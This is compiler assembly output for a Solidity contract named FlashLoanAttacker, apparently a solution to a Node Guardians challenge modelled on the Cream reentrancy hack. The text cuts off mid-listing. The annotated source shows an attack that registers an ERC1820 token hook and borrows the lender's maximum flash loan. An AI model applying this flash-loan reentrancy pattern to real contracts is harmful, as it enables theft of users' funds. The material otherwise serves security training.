\"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6145:6151  amount */\n      dup8\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6110:6152  gold.approve(address(flashLender), amount) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_62\n      swap3\n      swap2\n      swap1\n      tag_42\n      jump\t// in\n    tag_62:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_64\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_64:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_65\n      swap2\n      swap1\n      tag_46\n      jump\t// in\n    tag_65:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6102:6153  require(gold.approve(address(flashLender), amount)) */\n      tag_66\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_66:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6220:6265  keccak256(\"ERC3156FlashBorrower.onFlashLoan\") */\n      0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":6213:6265  return keccak256(\"ERC3156FlashBorrower.onFlashLoan\") */\n      swap1\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4913:6272  function onFlashLoan(... */\n      swap7\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4477:4784  function attack() public {... */\n    tag_17:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4510:4518  registry */\n      0x04\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4510:4542  registry.setInterfaceImplementer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x29965a1d\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4551:4552  0 */\n      0x00\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4555:4621  0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b */\n      0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4631:4635  this */\n      address\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4510:4637  registry.setInterfaceImplementer(address(0), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(this)) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_68\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_69\n      jump\t// in\n    tag_68:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_70\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_70:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_72\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_72:\n      pop\n      pop\n      pop\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4645:4659  uint maxAmount */\n      0x00\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4662:4673  flashLender */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4662:4686  flashLender.maxFlashLoan */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x613255ab\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4695:4699  gold */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4662:4701  flashLender.maxFlashLoan(address(gold)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_73\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_73:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_75\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_75:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_76\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_76:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4645:4701  uint maxAmount = flashLender.maxFlashLoan(address(gold)) */\n      swap1\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4709:4720  flashLender */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4709:4730  flashLender.flashLoan */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x5cffe9de\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4731:4735  this */\n      address\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4745:4749  gold */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4752:4761  maxAmount */\n      dup5\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4774:4775  0 */\n      0x00\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4763:4776  abi.encode(0) */\n      add(0x20, mload(0x40))\n      tag_77\n      swap2\n      swap1\n      tag_78\n      jump\t// in\n    tag_77:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4709:4777  flashLender.flashLoan(this, address(gold), maxAmount, abi.encode(0)) */\n      mload(0x40)\n      dup6\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_79\n      swap5\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_80\n      jump\t// in\n    tag_79:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_82\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_82:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_83\n      swap2\n      swap1\n      tag_46\n      jump\t// in\n    tag_83:\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4502:4784  {... */\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol\":4477:4784  function attack() public {... */\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_85:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":211:328   */\n    tag_86:\n        /* \"#utility.yul\":320:321   */\n      0x00\n        /* \"#utility.yul\":317:318   */\n      dup1\n        /* \"#utility.yul\":310:322   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_87:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:562   */\n    tag_88:\n        /* \"#utility.yul\":503:510   */\n      0x00\n        /* \"#utility.yul\":532:556   */\n      tag_142\n        /* \"#utility.yul\":550:555   */\n      dup3\n        /* \"#utility.yul\":532:556   */\n      tag_87\n      jump\t// in\n    tag_142:\n        /* \"#utility.yul\":521:556   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":568:690   */\n    tag_89:\n        /* \"#utility.yul\":641:665   */\n      tag_144\n        /* \"#utility.yul\":659:664   */\n      dup2\n        /* \"#utility.yul\":641:665   */\n      tag_88\n      jump\t// in\n    tag_144:\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":631:666   */\n      eq\n        /* \"#utility.yul\":621:684   */\n      tag_145\n      jumpi\n        /* \"#utility.yul\":680:681   */\n      0x00\n        /* \"#utility.yul\":677:678   */\n      dup1\n        /* \"#utility.yul\":670:682   */\n      revert\n        /* \"#utility.yul\":621:684   */\n    tag_145:\n        /* \"#utility.yul\":568:690   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":696:835   */\n    tag_90:\n        /* \"#utility.yul\":742:747   */\n      0x00\n        /* \"#utility.yul\":780:786   */\n      dup2\n        /* \"#utility.yul\":767:787   */\n      calldataload\n        /* \"#utility.yul\":758:787   */\n      swap1\n      pop\n        /* \"#utility.yul\":796:829   */\n      tag_147\n        /* \"#utility.yul\":823:828   */\n      dup2\n        /* \"#utility.yul\":796:829   */\n      tag_89\n      jump\t// in\n    tag_147:\n        /* \"#utility.yul\":696:835   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":841:918   */\n    tag_91:\n        /* \"#utility.yul\":878:885   */\n      0x00\n        /* \"#utility.yul\":907:912   */\n      dup2\n        /* \"#utility.yul\":896:912   */\n      swap1\n      pop\n        /* \"#utility.yul\":841:918   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":924:1046   */\n    tag_92:\n        /* \"#utility.yul\":997:1021   */\n      tag_150\n        /* \"#utility.yul\":1015:1020   */\n      dup2\n        /* \"#utility.yul\":997:1021   */\n      tag_91\n      jump\t// in\n    tag_150:\n        /* \"#utility.yul\":990:995   */\n      dup2\n        /* \"#utility.yul\":987:1022   */\n      eq\n        /* \"#utility.yul\":977:1040   */\n      tag_151\n      jumpi\n        /* \"#utility.yul\":1036:1037   */\n      0x00\n        /* \"#utility.yul\":1033:1034   */\n      dup1\n        /* \"#utility.yul\":1026:1038   */\n      revert\n        /* \"#utility.yul\":977:1040   */\n    tag_151:\n        /* \"#utility.yul\":924:1046   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1052:1191   */\n    tag_93:\n        /* \"#utility.yul\":1098:1103   */\n      0x00\n        /* \"#utility.yul\":1136:1142   */\n      dup2\n        /* \"#utility.yul\":1123:1143   */\n      calldataload\n        /* \"#utility.yul\":1114:1143   */\n      swap1\n      pop\n        /* \"#utility.yul\":1152:1185   */\n      tag_153\n        /* \"#utility.yul\":1179:1184   */\n      dup2\n        /* \"#utility.yul\":1152:1185   */\n      tag_92\n      jump\t// in\n    tag_153:\n        /* \"#utility.yul\":1052:1191   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1197:1314   */\n    tag_94:\n        /* \"#utility.yul\":1306:1307   */\n      0x00\n        /* \"#utility.yul\":1303:1304   */\n      dup1\n        /* \"#utility.yul\":1296:1308   */\n      revert\n        /* \"#utility.yul\":1320:1437   */\n    tag_95:\n        /* \"#utility.yul\":1429:1430   */\n      0x00\n        /* \"#utility.yul\":1426:1427   */\n      dup1\n        /* \"#utility.yul\":1419:1431   */\n      revert\n        /* \"#utility.yul\":1443:1560   */\n    tag_96:\n        /* \"#utility.yul\":1552:1553   */\n      0x00\n        /* \"#utility.yul\":1549:1550   */\n      dup1\n        /* \"#utility.yul\":1542:1554   */\n      revert\n        /* \"#utility.yul\":1579:2131   */\n    tag_97:\n        /* \"#utility.yul\":1636:1644   */\n      0x00\n        /* \"#utility.yul\":1646:1652   */\n      dup1\n        /* \"#utility.yul\":1696:1699   */\n      dup4\n        /* \"#utility.yul\":1689:1693   */\n      0x1f\n        /* \"#utility.yul\":1681:1687   */\n      dup5\n        /* \"#utility.yul\":1677:1694   */\n      add\n        /* \"#utility.yul\":1673:1700   */\n      slt\n        /* \"#utility.yul\":1663:1785   */\n      tag_158\n      jumpi\n        /* \"#utility.yul\":1704:1783   */\n      tag_159\n      tag_94\n      jump\t// in\n    tag_159:\n        /* \"#utility.yul\":1663:1785   */\n    tag_158:\n        /* \"#utility.yul\":1817:1823   */\n      dup3\n        /* \"#utility.yul\":1804:1824   */\n      calldataload\n        /* \"#utility.yul\":1794:1824   */\n      swap1\n      pop\n        /* \"#utility.yul\":1847:1865   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":1839:1845   */\n      dup2\n        /* \"#utility.yul\":1836:1866   */\n      gt\n        /* \"#utility.yul\":1833:1950   */\n      iszero\n      tag_160\n      jumpi\n        /* \"#utility.yul\":1869:1948   */\n      tag_161\n      tag_95\n      jump\t// in\n    tag_161:\n        /* \"#utility.yul\":1833:1950   */\n    tag_160:\n        /* \"#utility.yul\":1983:1987   */\n      0x20\n        /* \"#utility.yul\":1975:1981   */\n      dup4\n        /* \"#utility.yul\":1971:1988   */\n      add\n        /* \"#utility.yul\":1959:1988   */\n      swap2\n      pop\n        /* \"#utility.yul\":2037:2040   */\n      dup4\n        /* \"#utility.yul\":2029:2033   */\n      0x01\n        /* \"#utility.yul\":2021:2027   */\n      dup3\n        /* \"#utility.yul\":2017:2034   */\n      mul\n        /* \"#utility.yul\":2007:2015   */\n      dup4\n        /* \"#utility.yul\":2003:2035   */\n      add\n        /* \"#utility.yul\":2000:2041   */\n      gt\n        /* \"#utility.yul\":1997:2125   */\n      iszero\n      tag_162\n      jumpi\n        /* \"#utility.yul\":2044:2123   */\n      tag_163\n      tag_96\n      jump\t// in\n    tag_163:\n        /* \"#utility.yul\":1997:2125   */\n    tag_162:\n        /* \"#utility.yul\":1579:2131   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2137:3590   */\n    tag_8:\n        /* \"#utility.yul\":2263:2269   */\n      0x00\n        /* \"#utility.yul\":2271:2277   */\n      dup1\n        /* \"#utility.yul\":2279:2285   */\n      0x00\n        /* \"#utility.yul\":2287:2293   */\n      dup1\n        /* \"#utility.yul\":2295:2301   */\n      0x00\n        /* \"#utility.yul\":2303:2309   */\n      dup1\n        /* \"#utility.yul\":2311:2317   */\n      0x00\n        /* \"#utility.yul\":2319:2325   */\n      dup1\n        /* \"#utility.yul\":2368:2371   */\n      0xc0\n        /* \"#utility.yul\":2356:2365   */\n      dup10\n        /* \"#utility.yul\":2347:2354   */\n      dup12\n        /* \"#utility.yul\":2343:2366   */\n      sub\n        /* \"#utility.yul\":2339:2372   */\n      slt\n        /* \"#utility.yul\":2336:2456   */\n      iszero\n      tag_165\n      jumpi\n        /* \"#utility.yul\":2375:2454   */\n      tag_166\n      tag_85\n      jump\t// in\n    tag_166:\n        /* \"#utility.yul\":2336:2456   */\n    tag_165:\n        /* \"#utility.yul\":2495:2496   */\n      0x00\n        /* \"#utility.yul\":2520:2573   */\n      tag_167\n        /* \"#utility.yul\":2565:2572   */\n      dup12\n        /* \"#utility.yul\":2556:2562   */\n      dup3\n        /* \"#utility.yul\":2545:2554   */\n      dup13\n        /* \"#utility.yul\":2541:2563   */\n      add\n        /* \"#utility.yul\":2520:2573   */\n      tag_90\n      jump\t// in\n    tag_167:\n        /* \"#utility.yul\":2510:2573   */\n      swap9\n      pop\n        /* \"#utility.yul\":2466:2583   */\n      pop\n        /* \"#utility.yul\":2622:2624   */\n      0x20\n        /* \"#utility.yul\":2648:2701   */\n      tag_168\n        /* \"#utility.yul\":2693:2700   */\n      dup12\n        /* \"#utility.yul\":2684:2690   */\n      dup3\n        /* \"#utility.yul\":2673:2682   */\n      dup13\n        /* \"#utility.yul\":2669:2691   */\n      add\n        /* \"#utility.yul\":2648:2701   */\n      tag_90\n      jump\t// in\n    tag_168:\n        /* \"#utility.yul\":2638:2701   */\n      swap8\n      pop\n        /* \"#utility.yul\":2593:2711   */\n      pop\n        /* \"#utility.yul\":2750:2752   */\n      0x40\n        /* \"#utility.yul\":2776:2829   */\n      tag_169\n        /* \"#utility.yul\":2821:2828   */\n      dup12\n        /* \"#utility.yul\":2812:2818   */\n      dup3\n        /* \"#utility.yul\":2801:2810   */\n      dup13\n        /* \"#utility.yul\":2797:2819   */\n      add\n        /* \"#utility.yul\":2776:2829   */\n      tag_90\n      jump\t// in\n    tag_169:\n        /* \"#utility.yul\":2766:2829   */\n      swap7\n      pop\n        /* \"#utility.yul\":2721:2839   */\n      pop\n        /* \"#utility.yul\":2878:2880   */\n      0x60\n        /* \"#utility.yul\":2904:2957   */\n      tag_170\n        /* \"#utility.yul\":2949:2956   */\n      dup12\n        /* \"#utility.yul\":2940:2946   */\n      dup3\n        /* \"#utility.yul\":2929:2938   */\n      dup13\n        /* \"#utility.yul\":2925:2947   */\n      add\n        /* \"#utility.yul\":2904:2957   */\n      tag_93\n      jump\t// in\n    tag_170:\n        /* \"#utility.yul\":2894:2957   */\n      swap6\n      pop\n        /* \"#utility.yul\":2849:2967   */\n      pop\n        /* \"#utility.yul\":3034:3037   */\n      0x80\n        /* \"#utility.yul\":3023:3032   */\n      dup10\n        /* \"#utility.yul\":3019:3038   */\n      add\n        /* \"#utility.yul\":3006:3039   */\n      calldataload\n        /* \"#utility.yul\":3066:3084   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":3058:3064   */\n      dup2\n        /* \"#utility.yul\":3055:3085   */\n      gt\n        /* \"#utility.yul\":3052:3169   */\n      iszero\n      tag_171\n      jumpi\n        /* \"#utility.yul\":3088:3167   */\n      tag_172\n      tag_86\n      jump\t// in\n    tag_172:\n        /* \"#utility.yul\":3052:3169   */\n    tag_171:\n        /* \"#utility.yul\":3201:3265   */\n      tag_173\n        /* \"#utility.yul\":3257:3264   */\n      dup12\n        /* \"#utility.yul\":3248:3254   */\n      dup3\n        /* \"#utility.yul\":3237:3246   */\n      dup13\n        /* \"#utility.yul\":3233:3255   */\n      add\n        /* \"#utility.yul\":3201:3265   */\n      tag_97\n      jump\t// in\n    tag_173:\n        /* \"#utility.yul\":3183:3265   */\n      swap5\n      pop\n      swap5\n      pop\n        /* \"#utility.yul\":2977:3275   */\n      pop\n        /* \"#utility.yul\":3342:3345   */\n      0xa0\n        /* \"#utility.yul\":3331:3340   */\n      dup10\n        /* \"#utility.yul\":3327:3346   */\n      add\n        /* \"#utility.yul\":3314:3347   */\n      calldataload\n        /* \"#utility.yul\":3374:3392   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":3366:3372   */\n      dup2\n        /* \"#utility.yul\":3363:3393   */\n      gt\n        /* \"#utility.yul\":3360:3477   */\n      iszero\n      tag_174\n      jumpi\n        /* \"#utility.yul\":3396:3475   */\n      tag_175\n      tag_86\n      jump\t// in\n    tag_175:\n        /* \"#utility.yul\":3360:3477   */\n    tag_174:\n        /* \"#utility.yul\":3509:3573   */\n      tag_176\n        /* \"#utility.yul\":3565:3572   */\n      dup12\n        /* \"#utility.yul\":3556:3562   */\n      dup3\n        /* \"#utility.yul\":3545:3554   */\n      dup13\n        /* \"#utility.yul\":3541:3563   */\n      add\n        /* \"#utility.yul\":3509:3573   */\n      tag_97\n      jump\t// in\n    tag_176:\n        /* \"#utility.yul\":3491:3573   */\n      swap3\n      pop\n      swap3\n      pop\n        /* \"#utility.yul\":3285:3583   */\n      pop\n        /* \"#utility.yul\":2137:3590   */\n      swap3\n      swap6\n      swap9\n      pop\n      swap3\n      swap6\n      swap9\n      swap1\n      swap4\n      swap7\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3596:4705   */\n    tag_12:\n        /* \"#utility.yul\":3702:3708   */\n      0x00\n        /* \"#utility.yul\":3710:3716   */\n      dup1\n        /* \"#utility.yul\":3718:3724   */\n      0x00\n        /* \"#utility.yul\":3726:3732   */\n      dup1\n        /* \"#utility.yul\":3734:3740   */\n      0x00\n        /* \"#utility.yul\":3742:3748   */\n      dup1\n        /* \"#utility.yul\":3791:3794   */\n      0xa0\n        /* \"#utility.yul\":3779:3788   */\n      dup8\n        /* \"#utility.yul\":3770:3777   */\n      dup10\n        /* \"#utility.yul\":3766:3789   */\n      sub\n        /* \"#utility.yul\":3762:3795   */\n      slt\n        /* \"#utility.yul\":3759:3879   */\n      iszero\n      tag_178\n      jumpi\n        /* \"#utility.yul\":3798:3877   */\n      tag_179\n      tag_85\n      jump\t// in\n    tag_179:\n        /* \"#utility.yul\":3759:3879   */\n    tag_178:\n        /* \"#utility.yul\":3918:3919   */\n      0x00\n        /* \"#utility.yul\":3943:3996   */\n      tag_180\n        /* \"#utility.yul\":3988:3995   */\n      dup10\n        /* \"#utility.yul\":3979:3985   */\n      dup3\n        /* \"#utility.yul\":3968:3977   */\n      dup11\n        /* \"#utility.yul\":3964:3986   */\n      add\n        /* \"#utility.yul\":3943:3996   */\n      tag_90\n      jump\t// in\n    tag_180:\n        /* \"#utility.yul\":3933:3996   */\n      swap7\n      pop\n        /* \"#utility.yul\":3889:4006   */\n      pop\n        /* \"#utility.yul\":4045:4047   */\n      0x20\n        /* \"#utility.yul\":4071:4124   */\n      tag_181\n        /* \"#utility.yul\":4116:4123   */\n      dup10\n        /* \"#utility.yul\":4107:4113   */\n      dup3\n        /* \"#utility.yul\":4096:4105   */\n      dup11\n        /* \"#utility.yul\":4092:4114   */\n      add\n        /* \"#utility.yul\":4071:4124   */\n      tag_90\n      jump\t// in\n    tag_181:\n        /* \"#utility.yul\":4061:4124   */\n      swap6\n      pop\n        /* \"#utility.yul\":4016:4134   */\n      pop\n        /* \"#utility.yul\":4173:4175   */\n      0x40\n        /* \"#utility.yul\":4199:4252   */\n      tag_182\n        /* \"#utility.yul\":4244:4251   */\n      dup10\n        /* \"#utility.yul\":4235:4241   */\n      dup3\n        /* \"#utility.yul\":4224:4233   */\n      dup11\n        /* \"#utility.yul\":4220:4242   */\n      add\n        /* \"#utility.yul\":4199:4252   */\n      tag_93\n      jump\t// in\n    tag_182:\n        /* \"#utility.yul\":4189:4252   */\n      swap5\n      pop\n        /* \"#utility.yul\":4144:4262   */\n      pop\n        /* \"#utility.yul\":4301:4303   */\n      0x60\n        /* \"#utility.yul\":4327:4380   */\n      tag_183\n        /* \"#utility.yul\":4372:4379   */\n      dup10\n        /* \"#utility.yul\":4363:4369   */\n      dup3\n        /* \"#utility.yul\":4352:4361   */\n      dup11\n        /* \"#utility.yul\":4348:4370   */\n      add\n        /* \"#utility.yul\":4327:4380   */\n      tag_93\n      jump\t// in\n    tag_183:\n        /* \"#utility.yul\":4317:4380   */\n      swap4\n      pop\n        /* \"#utility.yul\":4272:4390   */\n      pop\n        /* \"#utility.yul\":4457:4460   */\n      0x80\n        /* \"#utility.yul\":4446:4455   */\n      dup8\n        /* \"#utility.yul\":4442:4461   */\n      add\n        /* \"#utility.yul\":4429:4462   */\n      calldataload\n        /* \"#utility.yul\":4489:4507   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":4481:4487   */\n      dup2\n        /* \"#utility.yul\":4478:4508   */\n      gt\n        /* \"#utility.yul\":4475:4592   */\n      iszero\n      tag_184\n      jumpi\n        /* \"#utility.yul\":4511:4590   */\n      tag_185\n      tag_86\n      jump\t// in\n    tag_185:\n        /* \"#utility.yul\":4475:4592   */\n    tag_184:\n        /* \"#utility.yul\":4624:4688   */\n      tag_186\n        /* \"#utility.yul\":4680:4687   */\n      dup10\n        /* \"#utility.yul\":4671:4677   */\n      dup3\n        /* \"#utility.yul\":4660:4669   */\n      dup11\n        /* \"#utility.yul\":4656:4678   */\n      add\n        /* \"#utility.yul\":4624:4688   */\n      tag_97\n      jump\t// in\n    tag_186:\n        /* \"#utility.yul\":4606:4688   */\n      swap3\n      pop\n      swap3\n      pop\n        /* \"#utility.yul\":4400:4698   */\n      pop\n        /* \"#utility.yul\":3596:4705   */\n      swap3\n      swap6\n      pop\n      swap3\n      swap6\n      pop\n      swap3\n      swap6\n      jump\t// out\n        /* \"#utility.yul\":4711:4788   */\n    tag_98:\n        /* \"#utility.yul\":4748:4755   */\n      0x00\n        /* \"#utility.yul\":4777:4782   */\n      dup2\n        /* \"#utility.yul\":4766:4782   */\n      swap1\n      pop\n        /* \"#utility.yul\":4711:4788   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4794:4912   */\n    tag_99:\n        /* \"#utility.yul\":4881:4905   */\n      tag_189\n        /* \"#utility.yul\":4899:4904   */\n      dup2\n        /* \"#utility.yul\":4881:4905   */\n      tag_98\n      jump\t// in\n    tag_189:\n        /* \"#utility.yul\":4876:4879   */\n      dup3\n        /* \"#utility.yul\":4869:4906   */\n      mstore\n        /* \"#utility.yul\":4794:4912   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4918:5140   */\n    tag_15:\n        /* \"#utility.yul\":5011:5015   */\n      0x00\n        /* \"#utility.yul\":5049:5051   */\n      0x20\n        /* \"#utility.yul\":5038:5047   */\n      dup3\n        /* \"#utility.yul\":5034:5052   */\n      add\n        /* \"#utility.yul\":5026:5052   */\n      swap1\n      pop\n        /* \"#utility.yul\":5062:5133   */\n      tag_191\n        /* \"#utility.yul\":5130:5131   */\n      0x00\n        /* \"#utility.yul\":5119:5128   */\n      dup4\n        /* \"#utility.yul\":5115:5132   */\n      add\n        /* \"#utility.yul\":5106:5112   */\n      dup5\n        /* \"#utility.yul\":5062:5133   */\n      tag_99\n      jump\t// in\n    tag_191:\n        /* \"#utility.yul\":4918:5140   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5146:5264   */\n    tag_100:\n        /* \"#utility.yul\":5233:5257   */\n      tag_193\n        /* \"#utility.yul\":5251:5256   */\n      dup2\n        /* \"#utility.yul\":5233:5257   */\n      tag_88\n      jump\t// in\n    tag_193:\n        /* \"#utility.yul\":5228:5231   */\n      dup3\n        /* \"#utility.yul\":5221:5258   */\n      mstore\n        /* \"#utility.yul\":5146:5264   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5270:5492   */\n    tag_20:\n        /* \"#utility.yul\":5363:5367   */\n      0x00\n        /* \"#utility.yul\":5401:5403   */\n      0x20\n        /* \"#utility.yul\":5390:5399   */\n      dup3\n        /* \"#utility.yul\":5386:5404   */\n      add\n        /* \"#utility.yul\":5378:5404   */\n      swap1\n      pop\n        /* \"#utility.yul\":5414:5485   */\n      tag_195\n        /* \"#utility.yul\":5482:5483   */\n      0x00\n        /* \"#utility.yul\":5471:5480   */\n      dup4\n        /* \"#utility.yul\":5467:5484   */\n      add\n        /* \"#utility.yul\":5458:5464   */\n      dup5\n        /* \"#utility.yul\":5414:5485   */\n      tag_100\n      jump\t// in\n    tag_195:\n        /* \"#utility.yul\":5270:5492   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5498:5641   */\n    tag_101:\n        /* \"#utility.yul\":5555:5560   */\n      0x00\n        /* \"#utility.yul\":5586:5592   */\n      dup2\n        /* \"#utility.yul\":5580:5593   */\n      mload\n        /* \"#utility.yul\":5571:5593   */\n      swap1\n      pop\n        /* \"#utility.yul\":5602:5635   */\n      tag_197\n        /* \"#utility.yul\":5629:5634   */\n      dup2\n        /* \"#utility.yul\":5602:5635   */\n      tag_92\n      jump\t// in\n    tag_197:\n        /* \"#utility.yul\":5498:5641   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5647:5998   */\n    tag_24:\n        /* \"#utility.yul\":5717:5723   */\n      0x00\n        /* \"#utility.yul\":5766:5768   */\n      0x20\n        /* \"#utility.yul\":5754:5763  